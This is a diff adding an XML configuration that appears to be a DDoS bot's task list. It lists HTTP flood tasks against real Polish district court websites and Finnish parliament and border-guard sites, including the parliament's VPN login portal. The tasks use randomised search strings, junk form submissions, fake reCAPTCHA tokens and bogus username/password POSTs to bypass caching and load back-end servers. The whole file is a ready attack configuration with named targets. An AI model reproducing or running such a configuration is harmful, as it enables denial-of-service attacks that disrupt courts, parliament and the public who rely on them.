@@ -1,0 +1,27 @@
+<?xml version="1.0" ?>
+<config>
+	<tasks delay="0" thread_count="-5">
+		<task type="http_10" period="0" method="POST" ip="212.33.68.4" port="443" host="bialystok.sr.gov.pl" path="/formularz-kontaktowy" response="1" allow_gzip="1" timeout="1000" https="1" body="d5be4f5bbee33ba149e23011bd32a081=1&amp;task=send&amp;from_name={.,15,20}+{.,15,20}&amp;from_email={.,15,20}%40gmail.com&amp;subject={.,15,20}&amp;area_data=rds56ijk5druj&amp;g-recaptcha-response=03ANYolq{.,561,561}&amp;send_button=Wy%C5%9Blij" id="397643992"/>
+		<task type="http_10" period="0" method="GET" ip="212.33.68.4" port="443" host="bialystok.sr.gov.pl" path="/component/search/?searchword={.,15,20}&amp;searchphrase=all&amp;Itemid=161" response="1" allow_gzip="1" timeout="1000" https="1" id="397731001"/>
+		<task type="http_10" period="0" method="GET" ip="212.33.68.4" port="443" host="bialystok.sr.gov.pl" path="/" response="1" allow_gzip="1" timeout="1000" https="1" id="397731015"/>
+		<task type="http_10" period="0" method="GET" ip="85.128.232.119" port="443" host="brodnica.sr.gov.pl" path="/index.php?p=cases&amp;action=search&amp;nrwydzial=II&amp;reper=Kp&amp;nrspr={d,1,3}&amp;rokrozpr=2018&amp;wydzial=0&amp;data=&amp;godz=GG%3AMM&amp;sala=" response="1" allow_gzip="1" timeout="1000" https="1" id="397731092"/>
+		<task type="http_10" period="0" method="GET" ip="85.128.232.119" port="443" host="brodnica.sr.gov.pl" path="/?p=search&amp;kword={.,15,20}" response="1" allow_gzip="1" timeout="1000" https="1" id="397731104"/>
+		<task type="http_10" period="0" method="GET" ip="85.128.232.119" port="443" host="brodnica.sr.gov.pl" path="/" response="1" allow_gzip="1" timeout="1000" https="1" id="397731110"/>
+		<task type="http_10" period="0" method="GET" ip="77.86.189.123" port="443" host="www.parkkivaraus.raja.fi" path="/" response="1" allow_gzip="1" timeout="1000" https="1" id="397731137"/>
+		<task type="http_10" period="0" method="POST" ip="77.86.189.123" port="443" host="www.parkkivaraus.raja.fi" path="/" response="1" allow_gzip="1" timeout="1000" https="1" body="username={.,15,20}&amp;password={.,15,20}&amp;logini=" id="397731155"/>
+		<task type="http_10" period="0" method="POST" ip="77.86.189.123" port="22" host="www.parkkivaraus.raja.fi" path="/" response="1" allow_gzip="1" timeout="1000" https="0" id="397731168"/>
+		<task type="http_10" period="0" method="GET" ip="13.224.68.129" port="443" host="avoindata.eduskunta.fi" path="/api/v1/tables/SaliDBAanestys/rows?perPage=10&amp;page=0&amp;columnValue={.,15,20}" response="1" allow_gzip="1" timeout="1000" https="1" id="397731201"/>
+		<task type="http_10" period="0" method="GET" ip="13.224.68.129" port="443" host="avoindata.eduskunta.fi" path="/digitoidut/search?q={.,15,20}&amp;language=%20*&amp;dateRange=before_1975&amp;from=0" response="1" allow_gzip="1" timeout="1000" https="1" id="397731209"/>
+		<task type="http_10" period="0" method="GET" ip="13.224.68.129" port="443" host="avoindata.eduskunta.fi" path="/resolution-register/api/public/resolutions?perPage=10&amp;page=0&amp;filter={.,16,20}&amp;languageCode=fi" response="1" allow_gzip="1" timeout="1000" https="1" id="397731221"/>
+		<task type="http_10" period="0" method="POST" ip="17.71.144.140" port="443" host="portti.eduskunta.fi" path="/dana-na/auth/url_1/login.cgi" response="1" allow_gzip="1" timeout="1000" https="1" body="tzoffset=180&amp;clientMAC=&amp;xsauthtoken={.,32,32}&amp;username={.,15,20}&amp;password={.,15,20}&amp;realm=EK_Realm&amp;btnSubmit=Kirjaudu" id="397731277"/>
+		<task type="http_10" period="0" method="GET" ip="17.71.144.140" port="443" host="portti.eduskunta.fi" path="/" response="1" allow_gzip="1" timeout="1000" https="1" id="397731305"/>
+		<task type="http_10" period="0" method="GET" ip="217.71.145.65" port="443" host="www.eduskunta.fi" path="/fi/search/sivut/results.aspx?k={.,15,20}" response="1" allow_gzip="1" timeout="1000" https="1" id="397731335"/>
+		<task type="http_10" period="0" method="GET" ip="217.71.145.65" port="443" host="www.eduskunta.fi" path="/kirjasto/EKS/eksdb/haku/{.,15,20}" response="1" allow_gzip="1" timeout="1000" https="1" id="397731377"/>
+		<task type="http_10" period="0" method="GET" ip="217.71.145.65" port="443" host="www.eduskunta.fi" path="/" response="1" allow_gzip="1" timeout="1000" https="1" id="397731384"/>
+		<task type="http_10" period="0" method="GET" ip="188.117.169.235" port="443" host="www.krakow-nowahuta.sr.gov.pl" path="/" response="1" allow_gzip="1" timeout="1000" https="1" id="397731429"/>
+		<task type="http_10" period="0" method="GET" ip="188.117.169.235" port="443" host="www.krakow-nowahuta.sr.gov.pl" path="/index.php?p=cases&amp;action=search&amp;nrwydzial=II&amp;reper=Kp&amp;nrspr={d,1,3}&amp;rokrozpr=2018&amp;wydzial=0&amp;data=&amp;godz=GG%3AMM&amp;sala=" response="1" allow_gzip="1" timeout="1000" https="1" id="397731441"/>
+		<task type="http_10" period="0" method="GET" ip="188.117.169.235" port="443" host="www.krakow-nowahuta.sr.gov.pl" path="/?p=search&amp;kword={.,15,20}" response="1" allow_gzip="1" timeout="1000" https="1" id="397731455"/>
+		<task type="http_10" period="0" method="GET" ip="193.33.175.58" port="443" host="www.rzeszow.sr.gov.pl" path="/search/node?keys={.,15,20}" response="1" allow_gzip="1" timeout="1000" https="1" id="397731531"/>
+		<task type="http_10" period="0" method="GET" ip="193.33.175.58" port="443" host="www.rzeszow.sr.gov.pl" path="/" response="1" allow_gzip="1" timeout="1000" https="1" id="397731551"/>
+	</tasks>
+</config>
